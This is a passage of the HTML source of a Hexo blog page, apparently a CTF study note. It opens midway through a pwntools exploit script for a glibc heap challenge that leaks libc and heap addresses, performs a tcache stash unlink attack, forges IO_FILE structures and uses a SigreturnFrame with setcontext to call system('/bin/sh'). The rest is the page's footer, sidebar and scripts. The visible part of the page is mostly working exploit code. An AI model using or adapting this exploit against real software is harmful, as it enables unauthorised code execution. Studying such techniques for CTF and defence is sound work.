class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>): </span><br><span class="line">	create(<span class="number">0x90</span>)</span><br><span class="line">	delete(i) <span class="comment">#0-5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">	create(<span class="number">0x1f0</span>)</span><br><span class="line">	delete(<span class="number">6</span>+i) <span class="comment">#6-12</span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#13 </span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#14</span></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">show(<span class="number">13</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">iolistall = libcbase + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">iostrjumps = libcbase + <span class="number">0x1ed560</span></span><br><span class="line">mallochook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">freehook = libcbase + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = libcbase + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heapbase = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) &amp; (~<span class="number">0xFFF</span>)</span><br><span class="line">log.success(<span class="string">&#x27;heapbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heapbase)))</span><br><span class="line">create(<span class="number">0x150</span>) <span class="comment">#15</span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#16</span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#17</span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#18</span></span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line">create(<span class="number">0x150</span>) <span class="comment">#19</span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#20</span></span><br><span class="line">edit(<span class="number">17</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x150</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(heapbase+<span class="number">0x15b0</span>) + p64(iolistall-<span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment">#21 tcache stash unlink attack    </span></span><br><span class="line"><span class="comment"># chain 0xe0 </span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#22 # &#x27;a&#x27;*0x110 + fake iofile </span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#23</span></span><br><span class="line">delete(<span class="number">22</span>)</span><br><span class="line">create(<span class="number">0x100</span>) <span class="comment">#24</span></span><br><span class="line">create(<span class="number">0x1f0</span>) <span class="comment">#25</span></span><br><span class="line">edit(<span class="number">17</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x150</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>) + p64(mallochook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rip = system</span><br><span class="line">frame.rdi = binsh </span><br><span class="line">frame.rsi = <span class="number">0</span> </span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = (freehook&amp;(~<span class="number">0xFFF</span>)) + <span class="number">0x8</span>	</span><br><span class="line">edit(<span class="number">6</span>, <span class="built_in">str</span>(frame))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake iofile1</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xe1</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(heapbase + <span class="number">0x660</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heapbase+<span class="number">0x2460</span>) + p64(heapbase+<span class="number">0x2460</span>+<span class="number">22</span>) + p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heapbase+<span class="number">0xc60</span>) <span class="comment"># chain to chunk0 </span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">0xd</span> + p64(iostrjumps)</span><br><span class="line"><span class="comment"># print(&#x27;###&#x27; + str(hex(len(payload))) + &#x27;###&#x27;)</span></span><br><span class="line">edit(<span class="number">22</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake iofile2 </span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xe1</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(heapbase + <span class="number">0x660</span>) + p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(heapbase+<span class="number">0x860</span>)+ p64(heapbase+<span class="number">0x860</span>+<span class="number">22</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heapbase+<span class="number">0xe60</span>) <span class="comment">#chain to chunk1 </span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">0xd</span> + p64(iostrjumps)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line">edit(<span class="number">7</span>, p64(setcontext+<span class="number">61</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake iofile3</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xe1</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(heapbase + <span class="number">0x660</span>) + p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(heapbase+<span class="number">0xa60</span>) + p64(heapbase+<span class="number">0xa70</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">0xd</span> + p64(iostrjumps)</span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment"># 通过exit()来触发_IO_flush_all_lockp</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/22/2.31-orw/" rel="next" title="2.31-orw">
+                <i class="fa fa-chevron-left"></i> 2.31-orw
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xxy1126" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1335926819@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">例题</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tm0tfl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
